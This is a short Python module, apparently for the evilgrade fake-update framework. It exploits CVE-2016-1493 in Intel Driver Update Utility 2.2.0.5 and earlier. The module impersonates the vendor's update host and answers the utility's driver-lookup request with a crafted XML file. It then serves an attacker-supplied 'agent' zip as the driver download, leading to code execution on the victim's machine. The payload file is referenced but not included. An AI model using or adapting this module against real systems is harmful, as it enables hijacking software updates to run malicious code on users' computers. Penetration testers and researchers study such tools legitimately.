# -*- coding: utf-8 -*-
from modules import ModuleBase


class IntelDriver(ModuleBase):
    name = 'inteldriver'
    version = '1.0'
    appver = ' <= Intel Driver Update Utility 2.2.0.5'
    author = ['Francisco Amato <famato +[AT]+ infobytesec.com']
    description = """CVE: CVE-2016-1493 Found By:  Joaquín Rodríguez Varela
        The Intel Driver Update Utility [1] is a tool that analyzes the system drivers on your computer.
        The utility reports if any new drivers are available, and provides the download files for the driver updates so you can install them quickly and easily.
        Intel [2] Driver Update Utility is prone to a Man in The Middle attack which could result in integrity corruption of the transferred data, information leak
        and consequently code execution.
        https://www.coresecurity.com/advisories/intel-driver-update-utility-mitm""",
    agent_filename = './agent/agent.zip'
    vh = '(storefront.download.protexis.net)' 
    requests = [
        {   'path': 'IDDAPI/Prod/productfamily/desktopboard/driver/getbyhardwaresignature/ven_8086&dev_010a/a08/190.xml',
            'type': 'file',
            'method': '',
            'bin': '0',
            'string': '',
            'parse': '1',
            'file': './include/inteldriver/general.xml',
        },
        {   'path': '.zip',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]
